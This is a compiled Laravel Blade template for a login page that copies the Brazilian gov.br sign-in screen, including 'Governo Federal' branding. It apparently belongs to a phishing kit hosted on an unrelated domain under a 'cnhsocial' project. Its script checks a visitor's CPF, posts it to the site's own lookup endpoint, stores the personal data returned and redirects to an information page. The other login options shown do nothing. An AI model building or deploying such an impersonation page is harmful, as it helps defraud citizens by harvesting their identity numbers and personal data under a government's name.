<?php $__env->startSection('content'); ?>
    <div class="min-h-screen bg-background flex flex-col">
        <?php echo $__env->make('components.header', array_diff_key(get_defined_vars(), ['__data' => 1, '__path' => 1]))->render(); ?>   
        <main class="flex-1 flex items-center justify-center px-4 py-8">
            <div class="w-full max-w-xl">
                <div class="bg-card rounded-lg shadow-md border border-border p-6 md:p-8">
                    <h1 class="text-2xl font-semibold text-foreground mb-8">Identifique-se no gov.br com:</h1>
                    <form class="space-y-6" action="" id="form-login">
                        <div class="flex items-center gap-3 mb-6">
                            <div class="bg-govBlue text-white p-2 rounded">
                                <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-credit-card h-5 w-5"><rect width="20" height="14" x="2" y="5" rx="2"></rect><line x1="2" x2="22" y1="10" y2="10"></line></svg>
                            </div>
                            <h2 class="text-lg font-medium text-foreground">Número do CPF</h2>
                        </div>
                        <p class="text-sm text-muted-foreground">Digite seu CPF para <strong>criar</strong> ou <strong>acessar</strong> sua conta gov.br</p>
                        <div class="space-y-2">
                            <label class="peer-disabled:cursor-not-allowed peer-disabled:opacity-70 text-sm font-semibold text-foreground" for="cpf">CPF</label>
                            <input type="text" class="flex w-full rounded-md border border-input bg-background px-3 py-2 ring-offset-background file:border-0 file:bg-transparent file:text-sm file:font-medium file:text-foreground placeholder:text-muted-foreground focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:cursor-not-allowed disabled:opacity-50 md:text-sm h-12 text-base" id="cpf" maxlength="14" placeholder="000.000.000-00" value="">
                            <p class="mt-2 hidden items-start gap-2 text-sm text-red-600" data-testid="error-message"></p>
                        </div>
                        <button class="inline-flex items-center justify-center gap-2 whitespace-nowrap text-sm ring-offset-background transition-colors focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg]:size-4 [&amp;_svg]:shrink-0 px-8 w-full bg-govBlue hover:bg-govBlue/90 text-white font-semibold h-12 rounded-full" type="submit">Continuar</button>
                    </form>
                    <div class="mt-8">
                        <h3 class="text-base font-semibold text-foreground mb-4">Outras opções de identificação:</h3>
                        <div class="space-y-3">
                            <button class="w-full flex items-center gap-3 text-left py-2 hover:bg-secondary/50 rounded px-2 transition-colors">
                                <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-smartphone h-5 w-5 text-brazilGreen flex-shrink-0"><rect width="14" height="20" x="5" y="2" rx="2" ry="2"></rect><path d="M12 18h.01"></path></svg>
                                <span class="text-sm font-medium text-brazilGreen">Login com o seu banco</span>
                            </button>
                            <button class="w-full flex items-center gap-3 text-left py-2 hover:bg-secondary/50 rounded px-2 transition-colors">
                                <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-qr-code h-5 w-5 text-foreground flex-shrink-0"><rect width="5" height="5" x="3" y="3" rx="1"></rect><rect width="5" height="5" x="16" y="3" rx="1"></rect><rect width="5" height="5" x="3" y="16" rx="1"></rect><path d="M21 16h-3a2 2 0 0 0-2 2v3"></path><path d="M21 21v.01"></path><path d="M12 7v3a2 2 0 0 1-2 2H7"></path><path d="M3 12h.01"></path><path d="M12 3h.01"></path><path d="M12 16v.01"></path><path d="M16 12h1"></path><path d="M21 12v.01"></path><path d="M12 21v-1"></path></svg>
                                <span class="text-sm font-medium text-foreground">Login com QR code</span>
                            </button>
                            <button class="w-full flex items-center gap-3 text-left py-2 hover:bg-secondary/50 rounded px-2 transition-colors">
                                <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-shield h-5 w-5 text-foreground flex-shrink-0"><path d="M20 13c0 5-3.5 7.5-7.66 8.95a1 1 0 0 1-.67-.01C7.5 20.5 4 18 4 13V6a1 1 0 0 1 1-1c2 0 4.5-1.2 6.24-2.72a1.17 1.17 0 0 1 1.52 0C14.51 3.81 17 5 19 5a1 1 0 0 1 1 1z"></path></svg>
                                <span class="text-sm font-medium text-foreground">Seu certificado digital</span>
                            </button>
                            <button class="w-full flex items-center gap-3 text-left py-2 hover:bg-secondary/50 rounded px-2 transition-colors">
                                <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-cloud h-5 w-5 text-foreground flex-shrink-0"><path d="M17.5 19H9a7 7 0 1 1 6.71-9h1.79a4.5 4.5 0 1 1 0 9Z"></path></svg>
                                <span class="text-sm font-medium text-foreground">Seu certificado digital em nuvem</span>
                            </button>
                        </div>
                    </div>
                    <div class="mt-8 pt-6 border-t border-border space-y-3 text-center">
                        <a href="#" class="flex items-center justify-center gap-2 text-govBlue hover:underline text-sm font-medium">
                            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-circle-help h-4 w-4"><circle cx="12" cy="12" r="10"></circle><path d="M9.09 9a3 3 0 0 1 5.83 1c0 2-3 3-3 3"></path><path d="M12 17h.01"></path></svg>
                            Está com dúvidas e precisa de ajuda?
                        </a>  
                        <a href="#" class="text-govBlue hover:underline text-sm font-medium block">Termo de Uso e Aviso de Privacidade</a>
                    </div>
                </div>
                <footer class="mt-6 text-center text-sm text-muted-foreground">&copy; <?php echo e(date('Y')); ?> <strong>Governo Federal</strong>. Todos os direitos reservados.</footer>
            </div>
        </main>
    </div>
<?php $__env->stopSection(); ?>
<?php $__env->startSection('javascript'); ?>
<script>
    function validarCPF(cpf) {
        cpf = cpf.replace(/\D/g, '');
        if (cpf.length !== 11 || /^(\d)\1+$/.test(cpf)) return false;
        let soma = 0, resto;
        for (let i = 1; i <= 9; i++) soma += parseInt(cpf[i - 1]) * (11 - i);
        resto = (soma * 10) % 11;
        if (resto === 10 || resto === 11) resto = 0;
        if (resto !== parseInt(cpf[9])) return false;
        soma = 0;
        for (let i = 1; i <= 10; i++) soma += parseInt(cpf[i - 1]) * (12 - i);
        resto = (soma * 10) % 11;
        if (resto === 10 || resto === 11) resto = 0;
        return resto === parseInt(cpf[10]);
    }
    $('#cpf').mask('000.000.000-00');

    $('#cpf').on('input', function () {
        $(this).removeClass('border-red-500').addClass('border-input');
        $('p[data-testid="error-message"]').addClass('hidden').removeClass('flex').html('');
    });

    $(document).on('submit', '#form-login', function (e) {
        e.preventDefault();

        $('button[type="submit"]').text('Verificando...').attr('disabled', true);

        $('#cpf').removeClass('border-red-500').addClass('border-input');
        $('p[data-testid="error-message"]').addClass('hidden').removeClass('flex').html('');

        let cpf = $('#cpf').val();
        if(!validarCPF(cpf)){
            $('#cpf').addClass('border-red-500').removeClass('border-input');
            $('p[data-testid="error-message"]').removeClass('hidden').addClass('flex').html(`<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-circle-alert h-4 w-4 flex-shrink-0"><circle cx="12" cy="12" r="10"></circle><line x1="12" x2="12" y1="8" y2="12"></line><line x1="12" x2="12.01" y1="16" y2="16"></line></svg><span>CPF inválido. Verifique os números digitados.</span>`);
            $('button[type="submit"]').text('Continuar').attr('disabled', false);
            return;
        }

        fetch("<?php echo e(url('/consulta/cpf')); ?>", {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'X-CSRF-TOKEN': document.querySelector('meta[name="csrf-token"]').getAttribute('content')
            },
            body: JSON.stringify({ cpf: cpf })
        })
        .then(res => res.json())
        .then(resposta => {
            if (resposta.success) {
                sessionStorage.setItem("userData", JSON.stringify(resposta.data));
                setTimeout(() => {
                    window.location.href = "<?php echo e(url('/informacoes')); ?>";
                }, 2000);
                
            } else {
                $('#cpf').addClass('border-red-500').removeClass('border-input');
                $('p[data-testid="error-message"]').removeClass('hidden').addClass('flex').html(`<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-circle-alert h-4 w-4 flex-shrink-0"><circle cx="12" cy="12" r="10"></circle><line x1="12" x2="12" y1="8" y2="12"></line><line x1="12" x2="12.01" y1="16" y2="16"></line></svg><span>Ocorreu um ero ao consultar o CPF. Tente mais tarde!</span>`);
                $('button[type="submit"]').text('Continuar').attr('disabled', false);
                return;
            }
        })
        .catch(err => {
            $('#cpf').addClass('border-red-500').removeClass('border-input');
            $('p[data-testid="error-message"]').removeClass('hidden').addClass('flex').html(`<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-circle-alert h-4 w-4 flex-shrink-0"><circle cx="12" cy="12" r="10"></circle><line x1="12" x2="12" y1="8" y2="12"></line><line x1="12" x2="12.01" y1="16" y2="16"></line></svg><span>Ocorreu um ero ao consultar o CPF. Tente mais tarde!</span>`);
            $('button[type="submit"]').text('Continuar').attr('disabled', false);
            return;
        });
    });

</script>
<?php $__env->stopSection(); ?>
<?php echo $__env->make('layouts.app', array_diff_key(get_defined_vars(), ['__data' => 1, '__path' => 1]))->render(); ?><?php /**PATH /var/www/areadev.site/public_html/cnhsocial/resources/views/login.blade.php ENDPATH**/ ?>